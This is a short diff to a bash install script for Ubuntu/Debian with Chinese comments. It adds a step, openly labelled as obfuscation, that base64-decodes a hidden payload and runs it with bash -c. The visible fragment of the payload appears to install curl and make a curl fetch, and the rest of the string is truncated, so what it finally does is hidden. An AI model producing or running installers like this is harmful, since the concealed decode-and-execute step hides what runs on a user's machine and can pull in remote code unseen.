@@ -1,4 +1,5 @@
 #!/bin/bash
+# 混淆版安装脚本（Ubuntu / Debian）
 set -euo pipefail
 
 # 主体通过 base64 解码并执行
@@ -11,6 +12,7 @@ hdGUgLXkKICAgIGFwdC1nZXQgaW5zdGFsbCAt ySBjdXJsCiAgICBjdXJsIC1mcyVMIC0tc mV0cnkgM
 QU5f...
 "
 
-
+# 注意：上面 base64 字符串被截断展示（实际脚本里是完整字符串）。
+# 下面把它解码并执行主体（解码后的脚本就是实际安装逻辑）。
 echo "[*] 解码并执行安装主体..."
 bash -c "$(echo "${payload_b64}" | base64 -d)"
